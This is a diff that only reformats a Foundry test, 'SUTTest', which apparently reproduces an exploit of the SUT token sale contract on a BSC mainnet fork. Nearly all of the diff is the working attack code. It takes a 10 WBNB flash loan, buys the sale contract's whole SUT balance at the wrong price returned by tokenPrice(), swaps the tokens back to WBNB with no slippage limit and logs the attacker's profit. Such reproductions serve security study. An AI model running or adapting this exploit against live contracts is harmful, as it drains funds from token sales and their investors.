@@ -24,9 +24,7 @@ interface IUniswapV3Router {
         uint160 sqrtPriceLimitX96;
     }
 
-    function exactInputSingle(
-        ExactInputSingleParams memory params
-    ) external payable returns (uint256 amountOut);
+    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
 }
 
 interface ISUTTokenSale {
@@ -38,17 +36,14 @@ interface ISUTTokenSale {
 contract SUTTest is Test {
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 SUT = IERC20(0x70E1bc7E53EAa96B74Fad1696C29459829509bE2);
-    IUniswapV3Router Router =
-        IUniswapV3Router(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
-    IDPPOracle DPPOracle =
-        IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
-    ISUTTokenSale SUTTokenSale =
-        ISUTTokenSale(0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37);
+    IUniswapV3Router Router = IUniswapV3Router(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
+    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
+    ISUTTokenSale SUTTokenSale = ISUTTokenSale(0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37);
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 30165901);
+        cheats.createSelectFork("bsc", 30_165_901);
         cheats.label(address(WBNB), "WBNB");
         cheats.label(address(SUT), "SUT");
         cheats.label(address(Router), "Router");
@@ -63,35 +58,19 @@ contract SUTTest is Test {
         DPPOracle.flashLoan(10e18, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
-            "Attacker WBNB balance after exploit",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
-        );
+            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
+            );
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         SUT.approve(address(Router), type(uint256).max);
         WBNB.withdraw(10e18);
 
-        emit log_named_uint(
-            "Incorrect SUT token price returned from tokenPrice() function",
-            SUTTokenSale.tokenPrice()
-        );
+        emit log_named_uint("Incorrect SUT token price returned from tokenPrice() function", SUTTokenSale.tokenPrice());
 
-        SUTTokenSale.buyTokens{value: 6.855184233076263744 ether}(
-            SUT.balanceOf(address(SUTTokenSale))
-        );
+        SUTTokenSale.buyTokens{value: 6.855184233076263744 ether}(SUT.balanceOf(address(SUTTokenSale)));
 
-        emit log_named_decimal_uint(
-            "Buyed number of SUT tokens",
-            SUT.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Buyed number of SUT tokens", SUT.balanceOf(address(this)), 18);
 
         // Swap all SUT tokens to WBNB
         SUTToWBNB();
@@ -106,16 +85,15 @@ contract SUTTest is Test {
     receive() external payable {}
 
     function SUTToWBNB() internal {
-        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router
-            .ExactInputSingleParams({
-                tokenIn: address(SUT),
-                tokenOut: address(WBNB),
-                fee: 2_500,
-                recipient: address(this),
-                amountIn: SUT.balanceOf(address(this)),
-                amountOutMinimum: 0,
-                sqrtPriceLimitX96: 0
-            });
+        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
+            tokenIn: address(SUT),
+            tokenOut: address(WBNB),
+            fee: 2500,
+            recipient: address(this),
+            amountIn: SUT.balanceOf(address(this)),
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
         Router.exactInputSingle(params);
     }
 }
